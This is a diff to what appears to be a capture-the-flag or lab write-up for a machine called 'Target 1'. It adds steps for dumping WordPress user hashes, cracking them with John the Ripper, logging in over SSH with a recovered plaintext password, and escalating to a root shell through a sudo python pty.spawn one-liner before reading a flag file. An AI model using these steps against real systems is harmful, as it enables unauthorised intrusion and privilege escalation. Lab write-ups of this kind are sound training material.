@@ -100,7 +100,20 @@ Target 1
           - `use wordpress;`
           - `show tables;`
           - `select * from wp_users;`
-
-![wp_users](/images/08%20wp%20users.png)
-
-          - d
+    - ![wp_users](/images/08%20wp%20users.png)
+      - Now to crack the hashes with John the Ripper:
+      - Command:
+        - `john hashes`
+        - There is no screenshot for this because it took too long to actually crack the hash.
+      - Once the password hash was cracked, SSH is the next thing to do.
+      - Then, Python was used to escalate to super user.
+        - Commands:
+          - `ssh steven@192.168.1.110`
+          - `pw:pink84`
+          - `sudo -l`
+          - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
+          - `cd /root`
+          - `ls`
+          - `cat flag4.txt`
+    
+[Image of Flag 04](/images/07%20FLAG%2004.PNG)
